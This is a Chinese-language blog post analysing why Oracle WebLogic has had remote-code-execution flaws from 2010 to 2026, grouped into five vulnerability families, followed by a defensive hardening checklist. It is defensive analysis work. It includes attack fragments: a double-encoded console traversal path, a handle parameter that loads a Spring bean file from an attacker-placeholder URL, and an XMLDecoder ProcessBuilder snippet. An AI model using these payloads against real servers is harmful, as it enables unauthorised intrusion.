---
title: 'WebLogic 历史漏洞成因简明分析（2010–2026）'
description: 'WebLogic 历史漏洞成因简明分析（2010–2026）'
pubDate: 2026-10-30
tags: ['Security']
---

## 一、先说结论

WebLogic 是 Oracle 的 Java EE 应用服务器，几乎每一个高危漏洞最终都指向同一个结果：**远程代码执行（RCE）**。

它之所以成为 RCE 重灾区，不是因为某几个函数写错了，而是因为**它的核心通信机制本身就是“执行型”的**：

- 它用私有 RMI 协议（T3）和标准 CORBA 协议（IIOP）在端口 7001 上收发 **Java 序列化对象**；
- 它的管理控制台（Console）用动态句柄（handle）机制实例化类、加载外部 XML；
- 它的 WebService 组件把一段 **XML 当成 Java 代码去执行**；
- 它的 JNDI 名字服务允许“绑定/查找远程引用”，于是服务器会被诱导**主动出网**去加载攻击者控制的类。

一句话：**凡是“把网络上来的不可信数据拿去做反序列化、动态求值、动态实例化”的地方，就是 WebLogic 的命门。** 十余年的漏洞史，就是攻击者不断在这些命门上换花样的过程。

---

## 二、攻击面全景

历史上 90% 的重大漏洞落在前两层（均为**预认证 RCE**，即无需登录即可打）：

| 攻击面 | 入口/协议 | 典型漏洞 | 是否需认证 |
|---|---|---|---|
| RPC 反序列化层 | T3（7001）、IIOP、JRMP | CVE-2015-4852、2018-2628、2020-2551 | 否 |
| WebService 组件层 | wls-wsat（SOAP）、/_async | CVE-2017-3506/10271、2019-2725 | 否 |
| JNDI 服务层 | T3/IIOP 远程 lookup、Console JNDI 页 | CVE-2017-10137、2023-21839 | 视入口而定 |
| Web 控制台层 | /console | CVE-2020-14750、14882/14883 | 多数否 |

记住这张表就够了：后面所有家族，都能挂回这四层里的某一层。

---

## 三、五大成因家族

### 家族一：Java 原生反序列化（T3/IIOP 把字节流当对象）

**成因一句话**：WebLogic 的 T3/IIOP 协议在通信时直接对客户端发来的 Java 序列化流调用 `ObjectInputStream.readObject()`，且早期没有任何类名过滤。攻击者只需在流里塞一条“gadget 链”（一串特殊对象），反序列化过程本身就会触发 `Runtime.exec()`。

**代表漏洞**

- **CVE-2015-4852（反序列化元年）**：未打补丁的 10.3.6 上，发送一条 commons-collections gadget（`InvokerTransformer` 链）即可执行命令。我们在自建靶机上实弹验证：`touch` 标记文件落地，服务端栈明确走到 `weblogic.rjvm.InboundMsgAbbrev.readObject()`。**结论：可利用。**
- **CVE-2018-2628**：T3 触发后，让服务器作为 JRMP 客户端**反向连回**攻击者的恶意 RMI 服务，再由对方回投 gadget。我们靶机上验证了“反向回连”通道成立（攻击者监听收到连接），完整 RCE 受 JDK 过滤器限制需特定 JDK 版本。
- **CVE-2020-2551**：T3 被防住后，攻击者**绕到 IIOP 协议**走同样的反序列化。实测服务器端 `IIOPInputStream → ObjectInputStream` 完整路径可达，服务器主动向攻击者端口发起 JRMP 握手。

**为什么难治**：Oracle 最初的修复是给 `resolveClass` 加**类名黑名单**。但黑名单天然滞后——攻击者只要换一个不在名单里的类、或者绕开那个特定的流（见家族四），就能继续打。这开启了长达数年的“绕过—拉黑—再绕过”。

---

### 家族二：XMLDecoder —— 把 XML 当代码执行

**成因一句话**：WebLogic 的 SOAP 处理头 `WorkContext` 里允许嵌入 `<java.beans.XMLDecoder>`。XMLDecoder 的设计目的本就是“用 XML 描述并重建 Java 对象”，它会**主动执行** XML 里写的构造逻辑——于是攻击者写一段 `<ProcessBuilder><start/></ProcessBuilder>` 就直接命令执行了。

**代表漏洞（同一套机制的四代绕过）**

| CVE | 绕过手法 | 修复方式 |
|---|---|---|
| 2017-3506 | `<object>` 标签 | 黑名单禁 `object` |
| 2017-10271 | 改用 `<void>` 标签（功能等价） | 黑名单禁 `new`/`method` |
| 2019-2725 | `<class>` 标签 + `UnitOfWorkChangeSet` | 黑名单禁 `class` |
| 2019-2729 | JDK 1.6 `<array method="forName">` | **终于用白名单**（做对了） |

**实弹验证**：CVE-2017-10271 在 10.3.6 靶机上，POST 一段 XMLDecoder 到 `/wls-wsat/CoordinatorPortType`，标记文件落地，内容含 `CVE-2017-10271-EXEC-ON-<主机名>-uid=1000`。**结论：可利用。**

**关键教训**：前三代全是“黑名单打地鼠”，每一代换个 XML 标签就能绕过；直到 2729 才改用白名单，才算真正止血。这是“黑名单必然失败”最直观的证据。

---

### 家族三：JNDI 注入（服务器被诱导主动出网）

**成因一句话**：WebLogic 的 JNDI 名字服务在处理某个对象时，会**以服务器自身身份**去对攻击者给的地址（LDAP/RMI）做 `lookup()`。如果服务器 JDK 版本较老（`< 8u191`，`trustURLCodebase=true`），就会从攻击者 HTTP 服务器**远程下载并加载恶意 Java 类**，static 块里的代码直接执行。

**代表漏洞**

- **CVE-2023-21839（旗舰级）**：攻击者通过 T3/IIOP 向 JNDI 绑定一个 `ForeignOpaqueReference`，其 `remoteJNDIName` 字段指向攻击者 LDAP。当该条目被 `lookup` 时，服务器侧 `getReferent()` 执行 `context.lookup(攻击者的 LDAP)`。我们在 12.2.1.4 靶机实测到 WebLogic 进程主动向判定端发起 LDAP BIND 报文（回连成立）；在 12.2.1.3 + JDK 8u181 靶机上进一步实弹完成**完整 RCE**（远程类加载、标记文件落地）。
- **CVE-2021-2109 / CVE-2024-20931**：同一思路落在 Console 的 JNDI 句柄、以及 `InitialContext` 初始化阶段，攻击面平移但根因相同。

**为什么危险**：这是“服务器主动连你”，传统“入站防火墙”拦不住；且一旦配合老 JDK 的远程类加载，就是开箱即用的 RCE。

---

### 家族四：Coherence 组件的独立反序列化

**成因一句话**：Oracle Coherence（随 WebLogic 分发的数据网格组件）自带一套**不依赖 JDK 的序列化框架**（ExternalizableLite/POF）。它用 `Class.forName` 还原对象，整个流程**不经过 `ObjectInputStream.resolveClass`**——也就是说，JDK 层的反序列化过滤器在这里被整体绕过了。再利用反射链（`Extractor` → `ReflectionExtractor` → `Runtime.exec`）完成命令执行。

**代表漏洞**

- **CVE-2020-2555 / 2883**：`BadAttributeValueExpException` / `PriorityQueue` 触发 `ChainedExtractor` 反射链。2883 是 2555 补丁的绕过，2025 年才进 KEV。
- **CVE-2020-14645 / 14825 / 14841**：黑名单再次被用 `UniversalExtractor`、`JdbcRowSetImpl` 等新前缀绕过。
- **CVE-2021-2135**：修复只在 `in instanceof ObjectInputStream` 时才启用过滤，而 **IIOP 路径的流是 `IIOPInputStream`，不继承 `ObjectInputStream`**——检查被整体跳过。

**核心教训**：用 `instanceof` 做安全边界，在存在多个平行实现时必然漏。这是家族一“绕过”逻辑的另一种体现。

---

### 家族五：Console 路径穿越与认证绕过

**成因一句话**：Console 的 URL 解析存在双重解码缺陷，攻击者用 `%252e%252e%252f`（`..` 的双重 URL 编码）绕过认证过滤器直达后台门户；再借 Console 的 **handle 机制**——按攻击者给的全限定类名实例化对象、并以攻击者提供的 URL 作为 Spring 配置文件初始化容器——实现无授权 RCE。

**代表漏洞**

- **CVE-2020-14882（路径穿越）**：`/console/css/%252e%252e%252fconsole.portal` 绕过认证，**无需登录**直达控制台主页。我们靶机实测返回 200 的 Console 主页，全程无凭据。
- **CVE-2020-14883（命令执行）**：在穿越路径后追加 `handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://攻击者/bean.xml")`，WebLogic 内嵌 Spring 加载恶意 bean（定义一个 `ProcessBuilder` 且 `init-method="start"`），命令执行。靶机上标记文件与 `id`/`hostname` 回显均落地。**结论：未授权 RCE 成立。**
- **CVE-2020-14750**：14882 的补丁绕过，Oracle 单独发带外安全告警，CVSS 9.8，未认证。

**注意**：拆开看，14883 本身需高权限；但 14882 + 14883 串联后就是未授权 RCE。补丁排序时不能只修 14883。

---

## 四、一条贯穿十余年的规律

把所有家族放在一起看，会浮现一个反复出现的错误模式：

> **对“不可信输入”做类名/标签/路径的黑名单，挡不住等价的语义替换；只有白名单（只允许已知安全的类型/路径/语法）才能真正切断。**

- XMLDecoder 四代绕过：换标签就行，直到白名单才停。
- 反序列化绕过：换 gadget 类、换流入口（T3→IIOP→JMS→Coherence）就行，黑名单永远在追。
- Console 第一版补丁用字符串数组拦 `..`/`%2E%2E`，Rapid7 指出“简单改大小写或双重编码即可绕过”，第二版才改成白名单。

另一个规律：**补丁发布与在野利用之间几乎没有缓冲**。CVE-2019-2725 在 Oracle 带外补丁发布**前一天**就遭勒索软件利用；CVE-2026-21962 的 PoC 公开当天即被利用。

---

## 五、2026 现状：漏洞不只没减少，节奏还变了

截至 2026-10，WebLogic 本体当年新增 **56 条 CVE**，其中 **29 条 CVSS ≥ 9.0，5 条满分 10.0**。几个结构性变化值得防守方注意：

1. **补丁节奏变成月度**。传统“Oracle 一年四次 CPU”已过时——2026 年有 27 条来自非 CPU 月的 CSPU（Critical Security Patch Update）。等下个季度 CPU 的策略，现在要多扛两个月风险。
2. **热点回到 Console 与代理插件**。5 条 10.0 里有 3 条挂 Console、2 条挂 Proxy Plug-in（路径穿越类）；代理插件 CVE-2026-21962 公开当天即被利用，KEV 整改期限只给 **3 天**。
3. **新入口出现**：SAML 协议首次作为独立漏洞面单列（CVE-2026-60206）；TopLink 组件也第一次独立挂进风险矩阵。
4. **KEV 条目已达 13 条**，且“在野半衰期”极长——CVE-2017-3506 补丁 7 年后（2024）才进 KEV 仍在野，长尾资产风险巨大。

**最新版本（15.1.1.0.0）的实弹结论**：在我们自建靶机对 Console、REST、IIOP/T3、ws_utc、_async/uddi/wls-wsat、Coherence、WLDF 共七面的默认配置复验中，**七面均未被未认证攻击者抵达**——匿名 IIOP 仅能完成 GIOP 握手，真正的方法调用被 `BEA-002045`/`BEA-000582` 网关拦截；ws_utc 的 HTTP 200 实为跳登录页的重定向假象。即：新版本默认攻击面显著小于老版本，但**前提是你没额外部署/开启那些老组件**。

---

## 六、怎么防（止血清单）

按性价比排序：

1. **关掉用不到的协议**。生产环境若不需要 T3/IIOP，直接在协议监听里禁用；这是挡住家族一、三、四大部分入口最便宜的一招。
2. **网络隔离**。WebLogic 管理端口（7001/Console）只对内网运维网段开放，禁止公网直连。家族五几乎都靠公网可达的 Console 触发。
3. **升级 JDK 到 8u191+（并设置 `trustURLCodebase=false`）**。这是切断家族三“远程类加载 RCE”的关键，让 JNDI 注入最多退化为信息泄露/SSRF。
4. **打补丁以“白名单式修复”为信号**。看到 advisory 说“加了黑名单”，要假设还有绕过；对 Console、XMLDecoder、Coherence 相关补丁优先级最高。
5. **关注月度 CSPU，别只等季度 CPU**。2026 年起补丁窗口要按月度规划。
6. **把 KEV 13 条当最低整改基线**。这些是被证实在野打过的，应无条件优先修。

---

*数据来源：自建非公开靶机实弹复现（CVE-2015-4852、2017-10271、2018-2628、2020-14882/14883、2020-2551、2023-21839 等）、Oracle CPU/CSPU 公告、CISA KEV 目录（2026-10 版）、NVD。文中统计口径：WebLogic 本体 CVE 公开可核实量级约 400+ 条，不同统计源因跨组件归属差异会有出入。*

